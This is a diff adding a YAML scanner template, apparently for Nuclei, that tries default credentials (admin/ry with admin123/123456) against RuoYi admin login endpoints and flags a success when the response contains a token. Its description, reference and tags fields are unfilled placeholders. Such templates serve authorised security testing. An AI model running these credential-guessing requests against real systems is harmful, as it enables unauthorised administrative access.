@@ -1,0 +1,62 @@
+id: ruoyi-default-login
+info:
+  name: ruoyi-default-login
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /prod-api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 42
+        Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json;charset=UTF-8
+        Istoken: false
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+        Sec-Ch-Ua-Platform: "macOS"
+        Origin: https://{{Hostname}}
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://{{Hostname}}/login?redirect=%2Findex
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Priority: u=1, i
+        Connection: close
+
+        {"username":"{{username}}","password":"{{password}}"}
+      - |-
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/json;charset=utf-8
+        Content-Language: zh_CN
+        isToken: false
+        Content-Length: 40
+        Origin: http://{{Hostname}}
+        Connection: close
+        Referer: http://{{Hostname}}/login?redirect=%2Fbiz%2Fduty
+
+        {"username":"{{username}}","password":"{{password}}"}
+    attack: clusterbomb
+    payloads:
+      username:
+        - admin
+        - ry
+      password:
+        - admin123
+        - 123456
+    matchers:
+      - type: word
+        part: body
+        words:
+          - token
